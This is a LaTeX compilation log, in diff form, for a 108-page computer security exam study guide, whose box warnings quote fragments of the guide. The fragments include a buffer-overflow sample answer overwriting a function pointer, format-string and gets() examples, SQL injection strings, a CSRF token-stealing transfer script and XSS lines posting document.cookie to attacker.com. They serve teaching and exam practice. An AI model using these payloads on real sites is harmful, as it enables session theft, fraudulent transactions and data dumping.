+OT1/cmr/m/n/12 )) = \OML/cmm/m/it/12 h$ \OT1/cmr/m/n/12 for ev-ery di-gest $\OM
+L/cmm/m/it/12 h$\OT1/cmr/m/n/12 . De-fine $\OML/cmm/m/it/12 f\OT1/cmr/m/n/12 (\
+OML/cmm/m/it/12 h\OT1/cmr/m/n/12 ) =
+ []
+
+[9] [10] [11] [12] [13] [14]
+LaTeX Font Info:    Trying to load font information for OMS+cmtt on input line 
+247.
+LaTeX Font Info:    No file OMScmtt.fd. on input line 247.
+
+
+LaTeX Font Warning: Font shape `OMS/cmtt/m/n' undefined
+(Font)              using `OMS/cmsy/m/n' instead
+(Font)              for symbol `textbraceleft' on input line 247.
+
+[15]
+Overfull \hbox (5.91121pt too wide) in paragraph at lines 254--255
+[]\OT1/cmr/m/it/12 Applying Step 4 (tab-u-late and cor-re-late runs): \OT1/cmr/
+m/n/12 The at-tacker sweeps all $\OML/cmm/m/it/12 q \OMS/cmtt/m/n/12 2 f\OT1/cm
+r/m/n/12 0\OML/cmm/m/it/12 ; [] ; \OT1/cmr/m/n/12 31\OMS/cmtt/m/n/12 g$
+ []
+
+[16] [17] [18] [19] [20]
+Overfull \hbox (32.43109pt too wide) in paragraph at lines 306--307
+[]\OT1/cmr/m/it/12 For more prac-tice, see past-exam in-stances: \OT1/cmr/m/n/1
+2 re-exam-problems-with-sample-solutions.pdf::7b 
+ []
+
+
+Overfull \hbox (12.2878pt too wide) in paragraph at lines 308--308
+[]\OT1/cmr/bx/n/17.28 Question Type 3: Memory-safety vul-ner-a-bil-ity iden-
+ []
+
+[21] [22]
+Underfull \hbox (badness 10000) in paragraph at lines 338--338
+[]\OT1/cmtt/m/n/12 memcpy(dst, src, len) \OT1/cmr/m/n/12 with attacker-controll
+ed $[] \OML/cmm/m/it/12 >
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 340--340
+[]\OT1/cmr/m/n/12 the saved re-turn ad-dress, reached with $[] +
+ []
+
+[23] [24]
+Overfull \hbox (14.25336pt too wide) in paragraph at lines 358--359
+\OT1/cmtt/m/n/12 session \OMS/cmtt/m/n/12 f \OT1/cmtt/m/n/12 char user[16]; voi
+d (*on[]done)(void); \OMS/cmtt/m/n/12 g\OT1/cmtt/m/n/12 ; void enroll(char *pac
+ket,
+ []
+
+
+Overfull \hbox (32.95335pt too wide) in paragraph at lines 358--359
+\OT1/cmtt/m/n/12 unsigned plen) \OMS/cmtt/m/n/12 f \OT1/cmtt/m/n/12 struct sess
+ion *s = malloc(sizeof(struct session)); s->on[]done
+ []
+
+
+Overfull \hbox (25.22433pt too wide) in paragraph at lines 358--359
+\OT1/cmtt/m/n/12 = log[]close; memcpy(s->user, packet, plen); /* Line A */ s->o
+n[]done(); /* Line
+ []
+
+
+Overfull \hbox (22.15736pt too wide) in paragraph at lines 358--359
+\OT1/cmtt/m/n/12 B */ \OMS/cmtt/m/n/12 g \OT1/cmtt/m/n/12 void dispatch(char *p
+acket, unsigned plen) \OMS/cmtt/m/n/12 f \OT1/cmtt/m/n/12 char cmd[24]; memcpy(
+cmd,
+ []
+
+
+Overfull \hbox (2.25333pt too wide) in paragraph at lines 358--359
+\OT1/cmtt/m/n/12 packet, plen); /* Line C */ exec[]cmd(cmd); /* Line D: unknown
+ commands are
+ []
+
+
+Overfull \hbox (12.4116pt too wide) in paragraph at lines 358--359
+\OT1/cmr/m/n/12 Give a value of \OT1/cmtt/m/n/12 plen \OT1/cmr/m/n/12 and an in
+-put to \OT1/cmtt/m/n/12 enroll \OT1/cmr/m/n/12 that makes the dae-mon ex-e-cut
+e \OT1/cmtt/m/n/12 spawn[]console\OT1/cmr/m/n/12 ,
+ []
+
+[25]
+Overfull \hbox (44.93445pt too wide) in paragraph at lines 365--366
+\OT1/cmr/m/n/12 (\OT1/cmtt/m/n/12 A$\OMS/cmtt/m/n/12 ^^B\OT1/cmr/m/n/12 16$) fo
+l-lowed by the 8-byte little-endian en-cod-ing of \OT1/cmtt/m/n/12 0x4011c8\OT1
+/cmr/m/n/12 , i.e. $[] [] [] [] [] [] [] []$.
+ []
+
+[26]
+Overfull \hbox (17.5812pt too wide) in paragraph at lines 368--369
+\OT1/cmr/m/n/12 copy: \OT1/cmtt/m/n/12 if (plen > sizeof s->user) return; \OT1/
+cmr/m/n/12 be-fore Line A and \OT1/cmtt/m/n/12 if (plen > sizeof
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 374--375
+\OT1/cmtt/m/n/12 result = 0; gets(input); if (strcmp(input, pwd) == 0) result =
+ 1;
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 374--375
+\OT1/cmtt/m/n/12 return result; \OMS/cmtt/m/n/12 g \OT1/cmtt/m/n/12 void main()
+ \OMS/cmtt/m/n/12 f \OT1/cmtt/m/n/12 int auth = check[]pwd(``12345''); if
+ []
+
+[27] [28]
+Underfull \hbox (badness 2073) in paragraph at lines 388--389
+[]\OT1/cmr/bx/n/12 Problem: \OT1/cmr/m/n/12 The fol-low-ing pro-gram is not mem
+-ory safe; \OT1/cmtt/m/n/12 input \OT1/cmr/m/n/12 and \OT1/cmtt/m/n/12 len
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 388--389
+\OT1/cmr/m/n/12 are con-trolled by an at-tacker. \OT1/cmtt/m/n/12 void process(
+char *input, size[]t
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 388--389
+\OT1/cmtt/m/n/12 len) \OMS/cmtt/m/n/12 f \OT1/cmtt/m/n/12 char buffer[32]; char
+ *tmp = malloc(32); if (tmp == NULL)
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 388--389
+\OT1/cmtt/m/n/12 return; memcpy(tmp, input, len); // Line A free(tmp); // Line 
+B
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 388--389
+\OT1/cmtt/m/n/12 strcat(buffer, input); // Line C printf(``%s\OMS/cmtt/m/n/12 n
+\OT1/cmtt/m/n/12 n'', buffer); // Line D
+ []
+
+[29]
+Underfull \hbox (badness 10000) in paragraph at lines 402--403
+\OT1/cmtt/m/n/12 *input) \OMS/cmtt/m/n/12 f \OT1/cmtt/m/n/12 char buffer[50]; c
+har secret[20] = ``Pwd123456''; if
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 402--403
+\OT1/cmtt/m/n/12 (strcmp(input, secret) == 0) print(secret); else printf(input)
+;
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 402--403
+\OT1/cmtt/m/n/12 strcpy(buffer, input); \OMS/cmtt/m/n/12 g \OT1/cmtt/m/n/12 int
+ main(int argc, char *argv[]) \OMS/cmtt/m/n/12 f \OT1/cmtt/m/n/12 if (argc
+ []
+
+[30]
+Overfull \hbox (31.12555pt too wide) in paragraph at lines 416--417
+[]\OT1/cmr/m/it/12 For more prac-tice, see past-exam in-stances: \OT1/cmr/m/n/1
+2 re-exam-problems-with-sample-solutions.pdf::6c 
+ []
+
+LaTeX Font Info:    Trying to load font information for OMS+cmr on input line 4
+21.
+(/usr/local/texlive/2025/texmf-dist/tex/latex/base/omscmr.fd
+File: omscmr.fd 2024/11/19 v2.5n Standard LaTeX font definitions
+)
+LaTeX Font Info:    Font shape `OMS/cmr/m/n' in size <12> not available
+(Font)              Font shape `OMS/cmsy/m/n' tried instead on input line 421.
+ [31] [32]
+[33] [34] [35] [36] [37] [38]
+Overfull \hbox (41.56989pt too wide) in paragraph at lines 529--530
+[]\OT1/cmr/m/it/12 For more prac-tice, see past-exam in-stances: \OT1/cmr/m/n/1
+2 re-exam-problems-with-sample-solutions.pdf::2b.1 
+ []
+
+[39] [40] [41] [42]
+Overfull \hbox (90.83691pt too wide) in paragraph at lines 599--600
+\OT1/cmr/m/n/12 shared key $\OML/cmm/m/it/12 K$\OT1/cmr/m/n/12 . The pro-to-col
+: Step 1: $\OML/cmm/m/it/12 Dev \OMS/cmsy/m/n/12 ! \OML/cmm/m/it/12 Dist \OT1/c
+mr/m/n/12 : \OML/cmm/m/it/12 FwID; Version; Firmware; Sig[]\OT1/cmr/m/n/12 (\OM
+L/cmm/m/it/12 FwID; Version\OT1/cmr/m/n/12 )$.
+ []
+
+
+Overfull \hbox (1.21463pt too wide) in paragraph at lines 599--600
+\OML/cmm/m/it/12 Cam \OT1/cmr/m/n/12 : \OML/cmm/m/it/12 FwID; Version; Firmware
+; MAC[]\OT1/cmr/m/n/12 (\OML/cmm/m/it/12 FwID; Version; Hash\OT1/cmr/m/n/12 (\O
+ML/cmm/m/it/12 Firmware\OT1/cmr/m/n/12 ))$. Step
+ []
+
+[43]
+Overfull \hbox (20.8581pt too wide) in paragraph at lines 603--604
+[]\OT1/cmr/m/it/12 Applying Step 1 (map): \OT1/cmr/m/n/12 Map be-fore judg-ing.
+ Leg 1 (Dev $\OMS/cmsy/m/n/12 !$ \OT1/cmr/m/n/12 Dist) puts $(\OML/cmm/m/it/12 
+FwID; Version\OT1/cmr/m/n/12 )$
+ []
+
+
+Overfull \hbox (32.1097pt too wide) in paragraph at lines 605--606
+\OML/cmm/m/it/12 Dev \OMS/cmsy/m/n/12 ! \OML/cmm/m/it/12 Dist \OT1/cmr/m/n/12 :
+ \OML/cmm/m/it/12 FwID; Version; Firmware; Sig[]\OT1/cmr/m/n/12 (\OML/cmm/m/it/
+12 FwID; Version; Hash\OT1/cmr/m/n/12 (\OML/cmm/m/it/12 Firmware\OT1/cmr/m/n/12
+ ))$,
+ []
+
+[44] [45]
+Underfull \hbox (badness 10000) in paragraph at lines 631--632
+[]\OT1/cmr/m/it/12 Applying Step 1 (map): \OT1/cmr/m/n/12 Five mes-sages. The o
+nly cryp-to-
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 631--632
+\OT1/cmr/m/n/12 graphic pro-tec-tion Bob re-lies on is the Server's signed proo
+f
+ []
+
+[46] [47] [48] [49] [50] [51] [52] [53] [54] [55] [56] [57] [58] [59] [60]
+[61] [62] [63] [64] [65]
+Overfull \hbox (31.12555pt too wide) in paragraph at lines 882--883
+[]\OT1/cmr/m/it/12 For more prac-tice, see past-exam in-stances: \OT1/cmr/m/n/1
+2 re-exam-problems-with-sample-solutions.pdf::8c 
+ []
+
+
+Overfull \hbox (24.2155pt too wide) in paragraph at lines 889--889
+[]\OT1/cmr/m/n/12 A script fetched from an-other ori-gin (e.g. \OT1/cmtt/m/n/12
+ <script src="https://attacker.com/x.js">\OT1/cmr/m/n/12 )
+ []
+
+[66]
+Overfull \hbox (178.48552pt too wide) in paragraph at lines 893--893
+\OT1/cmr/m/n/12 (SOP), but the side ef-fect has al-ready hap-pened. Trap: a \OT
+1/cmtt/m/n/12 <script src="fakebook.com/resetPassword?password=42">
+ []
+
+
+Overfull \hbox (17.99542pt too wide) in paragraph at lines 893--893
+\OT1/cmr/m/n/12 query the server builds by string con-cate-na-tion, e.g. \OT1/c
+mtt/m/n/12 "SELECT ... WHERE customerName
+ []
+
+[67]
+Underfull \hbox (badness 10000) in paragraph at lines 915--915
+[]\OT1/cmr/bx/it/12 XSS ex-fil-tra-tion \OT1/cmr/m/n/12 (needs HttpOnly=false):
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 915--915
+\OT1/cmtt/m/n/12 <script>post("https://attacker.com",
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 915--915
+[]\OT1/cmr/bx/it/12 XSS action-forging\OT1/cmr/m/n/12 : read any needed se-
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 915--915
+\OT1/cmr/m/n/12 cret from the page, then POST: \OT1/cmtt/m/n/12 <script>var
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 915--915
+\OT1/cmtt/m/n/12 t=document.getElementsByName("csrf")[0].value;
+ []
+
+
+Overfull \hbox (8.80824pt too wide) in paragraph at lines 915--915
+\OT1/cmtt/m/n/12 post("/transfer", "to=mallory,amount=200,csrf="+t)</script>\OT
+1/cmr/m/n/12 . 
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 915--915
+[]\OT1/cmr/bx/it/12 SQLi\OT1/cmr/m/n/12 : \OT1/cmtt/m/n/12 ' OR 1=1 --  \OT1/cm
+r/m/n/12 to dump all rows; \OT1/cmtt/m/n/12 x' AND
+ []
+
+
+Underfull \hbox (badness 7186) in paragraph at lines 915--915
+\OT1/cmtt/m/n/12 customerName='Bob' --  \OT1/cmr/m/n/12 for boolean in-fer-ence
+; ap-pend \OT1/cmtt/m/n/12 AND
+ []
+
+[68] [69]
+Underfull \hbox (badness 1168) in paragraph at lines 925--926
+[]\OT1/cmr/bx/n/12 Variation 2 (CSRF dis-guised as XSS): \OT1/cmr/m/n/12 A pay-
+load like \OT1/cmtt/m/n/12 <script
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 925--926
+\OT1/cmtt/m/n/12 src="https://fakebook.com/resetPassword?password=42"></script>
+
+ []
+
+[70] [71]
+Overfull \hbox (305.05716pt too wide) detected at line 939
+[]
+ []
+
+
+Overfull \hbox (53.81824pt too wide) in paragraph at lines 943--944
+\OT1/cmr/m/n/12 an-swer: the stored ti-tle \OT1/cmtt/m/n/12 <script>var t=docum
+ent.getElementsByName("csrf")[0].value;
+ []
+
+
+Overfull \hbox (7.57573pt too wide) in paragraph at lines 943--944
+\OT1/cmtt/m/n/12 post("/transfer", "to=mallory,amount=200,csrf="+t)</script>\OT
+1/cmr/m/n/12 , de-liv-ered by
+ []
+
+[72]
+Overfull \hbox (205.06302pt too wide) in paragraph at lines 956--956
+\OT1/cmr/m/n/12 Al-bin loads \OT1/cmtt/m/n/12 www.readbooks.com/home?msg=<scrip
+t>post("www.attacker.com",document.cookie)</script>\OT1/cmr/m/n/12 ;
+ []
+
+
+Overfull \hbox (106.40079pt too wide) in paragraph at lines 959--960
+\OT1/cmr/bx/n/12 Answer: \OT1/cmr/m/n/12 Events: 3, None; then 2, \OT1/cmtt/m/n
+/12 <script>post("www.attacker.com",document.cookie)</script>
+ []
+
+[73]
+Underfull \hbox (badness 2662) in paragraph at lines 963--964
+\OT1/cmr/m/n/12 ac-counts. Mal-lory makes a Fake-Book post with the con-tents \
+OT1/cmtt/m/n/12 <script
+ []
+
+[74]
+Overfull \hbox (236.70981pt too wide) detected at line 986
+[]
+ []
+
+[75]
+Overfull \hbox (32.43109pt too wide) in paragraph at lines 993--994
+[]\OT1/cmr/m/it/12 For more prac-tice, see past-exam in-stances: \OT1/cmr/m/n/1
+2 re-exam-problems-with-sample-solutions.pdf::3b 
+ []
+
+
+Overfull \hbox (39.5538pt too wide) in paragraph at lines 995--995
+[]\OT1/cmr/bx/n/17.28 Question Type 9: Pass-word stor-age and authentication-
+ []
+
+[76] [77] [78] [79] [80]
+Underfull \hbox (badness 1297) in paragraph at lines 1040--1041
+\OT1/cmr/m/n/12 the scheme sends $\OML/cmm/m/it/12 H[]\OT1/cmr/m/n/12 (\OML/cmm
+/m/it/12 pwd \OMS/cmsy/m/n/12 k \OML/cmm/m/it/12 salt\OT1/cmr/m/n/12 )$ at lo-g
+in $\OML/cmm/m/it/12 i$ \OT1/cmr/m/n/12 and the server ver-i-fies
+ []
+
+[81] [82]
+Overfull \hbox (23.10991pt too wide) in paragraph at lines 1061--1061
+\OT1/cmr/m/n/12 into all $\OML/cmm/m/it/12 U$ \OT1/cmr/m/n/12 en-tries: $1$ has
+h (writes are free). (b) Per user com-pute $\OML/cmm/m/it/12 H\OT1/cmr/m/n/12 (
+\OML/cmm/m/it/12 letmein \OMS/cmsy/m/n/12 k \OML/cmm/m/it/12 username\OT1/cmr/m
+/n/12 )$:
+ []
+
+[83] [84] [85]
+Underfull \hbox (badness 1014) in paragraph at lines 1089--1089
+[]\OT1/cmr/bx/n/12 Exam Prac-tice: Reg-u-lar exam (exam-problems-with-solutions
+.pdf),
+ []
+
+[86] [87] [88]
+Overfull \hbox (9.28412pt too wide) in paragraph at lines 1123--1124
+[]\OT1/cmr/m/it/12 For more prac-tice, see past-exam in-stances: \OT1/cmr/m/n/1
+2 dasak18combinedWithSolutions-1.pdf::Part
+ []
+
+[89] [90] [91]
+Underfull \hbox (badness 2529) in paragraph at lines 1161--1161
+[]\OT1/cmr/m/n/12 spoofing is fixed at the source by the \OT1/cmr/bx/it/12 at-t
+acker's ISP \OT1/cmr/m/n/12 via
+ []
+
+[92] [93] [94] [95] [96] [97]
+Overfull \hbox (31.77832pt too wide) in paragraph at lines 1230--1231
+[]\OT1/cmr/m/it/12 For more prac-tice, see past-exam in-stances: \OT1/cmr/m/n/1
+2 re-exam-problems-with-sample-solutions.pdf::5a 
+ []
+
+[98] [99] [100] [101] [102] [103] [104]
+Underfull \hbox (badness 2564) in paragraph at lines 1339--1340
+[]\OT1/cmr/m/it/12 Applying Step 5 (har-vest, part b): \OT1/cmr/m/n/12 Sam-ple 
+so-lu-tion: the at-tacker
+ []
+
+[105] [106]
+Overfull \hbox (5.48317pt too wide) in paragraph at lines 1351--1352
+[]\OT1/cmr/bx/n/12 Question Type 2 (Cache/timing side-channel at-tack anal-y-si
+s and constant-
+ []
+
+[107]
+Overfull \hbox (32.79422pt too wide) in paragraph at lines 1359--1360
+[]\OT1/cmr/bx/n/12 Question Type 10 (DoS at-tack con-struc-tion and coun-ter-me
+a-sure/responsibility
+ []
+
+[108] (./study_guide.aux)
+ ***********
+LaTeX2e <2025-11-01>
+L3 programming layer <2026-01-19>
+ ***********
+
+
+LaTeX Font Warning: Some font shapes were not available, defaults substituted.
+
+ ) 
+Here is how much of TeX's memory you used:
+ 18580 strings out of 467533
+ 393904 string characters out of 5419495
+ 824110 words of memory out of 5000000
+ 47185 multiletter control sequences out of 15000+600000
+ 638810 words of font info for 83 fonts, out of 8000000 for 9000
+ 1141 hyphenation exceptions out of 8191
+ 116i,8n,121p,2399b,1021s stack positions out of 10000i,1000n,20000p,200000b,200000s
+</usr/local/texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmbx12.pfb
+></usr/local/texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmbxti10.pf
+b></usr/local/texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmex10.pfb
+></usr/local/texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmitt10.pfb
+></usr/local/texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmmi12.pfb>
+</usr/local/texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmmi6.pfb></
+usr/local/texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmmi8.pfb></us
+r/local/texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmr12.pfb></usr/
+local/texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmr17.pfb></usr/lo
+cal/texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmr8.pfb></usr/local
+/texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmsy10.pfb></usr/local/
+texlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmsy8.pfb></usr/local/te
+xlive/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmti12.pfb></usr/local/tex
+live/2025/texmf-dist/fonts/type1/public/amsfonts/cm/cmtt12.pfb></usr/local/texl
+ive/2025/texmf-dist/fonts/type1/public/cm-super/sfrm1200.pfb></usr/local/texliv
+e/2025/texmf-dist/fonts/type1/public/cm-super/sftt1200.pfb>
+Output written on study_guide.pdf (108 pages, 637010 bytes).
+PDF statistics:
+ 436 PDF objects out of 1000 (max. 8388607)
+ 291 compressed objects within 3 object streams
+ 0 named destinations out of 1000 (max. 500000)
+ 13 words of extra memory for PDF output out of 10000 (max. 10000000)
+
